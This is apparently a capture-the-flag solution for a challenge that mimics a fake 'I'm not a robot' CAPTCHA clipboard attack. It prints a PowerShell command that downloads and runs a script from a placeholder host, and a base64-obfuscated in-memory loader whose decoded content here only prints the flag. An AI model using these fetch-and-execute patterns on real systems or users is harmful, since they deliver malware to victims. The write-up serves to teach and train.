# Solution

1. The website has a `I'm not a robot` button.
2. Click on it and instructions will be given.
3. This will be added to the device's clipboard.
```ps1
cmd /c PowerShell.exe "iex ((New-Object System.Net.WebClient).DownloadString('http://<web-hostname>/verify.ps1'))" # 'FREE ROADBLOACKERS VERIFICATION ID: 21402'
```

4. After going to the `/verify.ps1`, you will see this code.
```ps1
powershell -NoP -C "$b=[System.Convert]::FromBase64String('UEsDBBQAAAAIADScj1l1EgLhwgAAAP8AAAALAAAAcGF5bG9hZC5wczFljEFrwkAQRv/KdxBWoS6leJNeiqENQhMU6zEsm4kOXWZ1sotG8b83vbaXd3jwHneYwpxuwWBOZ5hwu5oZ7tgrJ5pXOZ1ygtmW7y+Luzw33aagRqu33bVRrh8GD1Do6V9QqEZF5X1WarE/ciCsIssBX6TcsXeJo1jUgdyYJx3gDo4FwSVSO36Xf461Ut/DyYBvGpAifJTEkslaa5aYSA4Br5h8xD7ZXWk37vJLcu2ahqn5jIU/xqdSfMgtjWoVL2JmP1BLAQIUAxQAAAAIADScj1l1EgLhwgAAAP8AAAALAAAAAAAAAAAAAACkgQAAAABwYXlsb2FkLnBzMVBLBQYAAAAAAQABADkAAADrAAAAAAA=');$m=New-Object System.IO.MemoryStream($b);Add-Type -A 'System.IO.Compression.FileSystem';$e=[System.IO.Compression.ZipFile]::Open($m,'Read').Entries[0].Open();$r=New-Object System.IO.StreamReader($e);IEX $r.ReadToEnd()"
```

5. There is a Base64 file string inside. Convert the Base64 to file. There you will find your flag.
```ps1
if ( 'pzl' -eq 'lzx') { Write-Output 'SIG24{n0_fREe_rOBUx_riP}' } else { Write-Output 'Error Occured While Doing Verification. Please try again later.' }; Write-Output 'Press any key to continue...'; $null = $Host.UI.RawUI.ReadKey('NoEcho,IncludeKeyDown')
```